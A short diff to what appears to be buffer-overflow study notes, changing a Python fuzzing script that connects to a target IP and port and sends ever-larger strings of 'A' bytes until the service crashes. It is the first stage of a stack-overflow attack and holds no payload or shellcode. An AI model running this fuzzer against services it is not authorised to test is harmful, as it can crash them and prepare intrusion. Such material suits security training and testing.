@@ -1,13 +1,13 @@
-The below is the Python templates for the different stages of BOF.
+There are different stages of BOF and we'll have different scripts for each stage:
 
 ### Spiking & Fuzzing
-```
+```Python
 #!/usr/bin/python
 
 import socket,sys
 from time import sleep
 
-buffer = "A" * 500
+buffer = "A" * 100
 RHOST = #IP address of the target machine, example: "10.10.10.0"
 RPORT = #Port number of the target machine, example: 21 
 
@@ -18,7 +18,7 @@ while True:
         s.send(buffer + '\r\n')
         s.close()
         sleep(1)
-        buffer += "A" * 500
+        buffer += "A" * 100
     except:
         print("Debugger crashed at %s bytes" % str(len(buffer)))
         sys.exit
